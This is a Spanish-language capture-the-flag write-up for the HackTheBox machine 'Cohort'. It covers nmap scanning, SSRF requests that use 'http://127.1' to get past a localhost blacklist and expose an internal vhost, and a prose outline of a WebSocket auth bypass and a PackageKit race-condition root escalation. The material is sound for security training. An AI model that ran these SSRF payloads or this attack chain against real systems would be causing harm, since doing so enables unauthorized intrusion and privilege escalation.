Write-up: Cohort (HackTheBox)

Dificultad: Media | Plataforma: HackTheBox | OS: Linux

Objetivos: Explotación de SSRF, Bypass de restricciones de red, Explotación de WebSockets (CVE-2026-39987) y Escalada de privilegios local mediante PackageKit (CVE-2026-41651 - Pack2TheRoot).

1. Reconocimiento y Enumeración Inicial

Comenzamos realizando un escaneo de puertos mediante nmap para identificar los servicios expuestos:

nmap -v -p- --open -T4 -sS -n -oX escaneo.xml 10.129.119.9

El escaneo revela los puertos:

  • 22/tcp - SSH
  • 80/tcp - HTTP
  • 443/tcp - HTTPS

Añadimos la resolución estática al archivo /etc/hosts:

echo "10.129.119.9 cohort.htb" | sudo tee -a /etc/hosts

2. Enumeración Web y Hallazgo de SSRF

Al interactuar con la aplicación web, interceptamos una solicitud POST al endpoint /api/validate:

POST /api/validate HTTP/1.1
Host: cohort.htb
Content-Type: application/json

{ "url": "http://test.com/log.csv", "format": "csv" }

Se identifica un filtro que rechaza direcciones locales (blacklist). Probamos un bypass de SSRF:

curl -s -k -X POST https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.1/", "format": "csv"}'

3. Descubrimiento de Servicios Internos y Nginx (/status)

Consultando el endpoint protegido /status a través del SSRF:

curl -s -k -X POST https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.1/status", "format": "csv"}'

Esto revela un Virtual Host oculto: nb-1be3782a8afd3ad5.cohort.htb que apunta al puerto 8888 (Marimo).

4. Explotación de Marimo (CVE-2026-39987)

Se explota la omisión de autenticación previa en la ruta WebSocket /terminal/ws para obtener una consola interactiva sin credenciales.

5. Escalada de Privilegios: Pack2TheRoot (CVE-2026-41651)

Se detecta una versión vulnerable de PackageKit (1.0.2 - 1.3.4). Tras transferir el exploit y ganar una condición de carrera (race condition), logramos generar una bash con SUID y obtener privilegios de root.
